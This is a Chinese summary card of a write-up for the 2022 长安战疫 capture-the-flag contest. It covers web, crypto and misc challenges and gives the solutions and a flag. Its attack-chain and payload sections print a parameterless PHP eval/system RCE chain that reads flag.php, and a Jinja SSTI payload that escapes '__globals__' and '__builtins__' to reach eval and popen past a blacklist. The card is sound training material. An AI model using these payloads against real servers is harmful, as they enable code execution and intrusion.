---
title: "长安战疫-WriteUp"
category: web
tags: ["长安战疫", "web", "无参RCE", "SSTI-unicode8进制转义", "凯撒", "字节XOR"]
signals: ["长安战疫 2022", "无参RCE", "SSTI-unicode8进制转义", "凯撒", "字节XOR", "Sage线性方程组", "AES-ECB爆破", "Python-stegosaurus", "threading线程竞争", "ssti", "RCE", "array_rand", "array_flip", "array_values"]
difficulty: medium
source: "https://www.ctfiot.com/22102.html"
tools: ["C", "Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 长安战疫-WriteUp

> 赛事：长安战疫 2022 | 方向：web | 难度：medium | 工具：C、Python

## 一句话总结

长安战疫2022多方向:无参RCE array_rand+array_flip+array_values+get_defined_vars+eval+SSTI 8进制Unicode转义+凯撒D减3 A→X+Java字节77,68,65=MA+Python stegosaurus +Sage线性方程组+2^20 AES-ECB爆破+线程竞争XOR 10字符flag

## 攻击链

1. 无参RCE: ?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&a=system(''cat flag.php'')|admin?name={{2*2}}.js:SSTI 8进制\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f=__globals__|凯撒: ''FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]'' D-Z减3, A→X, B→Y, C→Z, ?→_|Java字节+echo: 77,68,65,77+ASCII+换行|MD5爆破: bitset等|strtr+substr+eval混淆|Python stegosaurus:./stegosaurus -x steg.pyc|Sage线性方程组: a,b,c,a+b+c=解|AES-ECB爆破2^20|线程竞争: f[9]^=9→f[8]^=f[9]→f[7]^=7交替 模拟num递减

## 关键 payload

```
?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&a=system(''cat flag.php'')|{{2*2}}.js|{%print(lipsum|attr(''\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f'')|attr(''\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f'')(''\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'')|attr(''\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f'')(''eval''))(...popen...)%}|M = Matrix(R,[[d[2],d[3],d[4]],[d[1],d[2],d[3]],[1,1,1]]); res=vector(R,d[3:]); M.solve_left(res)|for i in range(2**20): key=pad(long_to_bytes(i)); if b"cazy" in m: print(m); break|flag{Ch1na_yyds_cazy}
```

## 经验教训

1) 无参RCE:eval(array_rand(array_flip(current(array_values(get_defined_vars()))))); random key in args; 2) SSTI 8进制转义:'\u005f\u005f'='__',逐字符编码绕黑名单; 3) 凯撒D-Z减3 A→X B→Y C→Z ?→_; 4) Java字节流:77 68 65 77 78 ... 77 84→MA...XT; 5) Python stegosaurus .pyc中嵌payload; 6) Sage线性方程组求a,b,c三数; 7) AES-ECB爆破2^20 key空间; 8) 线程竞争:encode_1(f[i]^=i) + encode_2(f[i]^=f[i+1]) 间隔0.5s启动,num共享变量

## 标签

无参RCE、SSTI-unicode8进制转义、凯撒、字节XOR、Sage线性方程组、AES-ECB爆破、Python-stegosaurus、threading线程竞争、Happy数组

## 参考来源

- https://www.ctfiot.com/22102.html
- 原文件：长安战疫-WriteUp.full.md
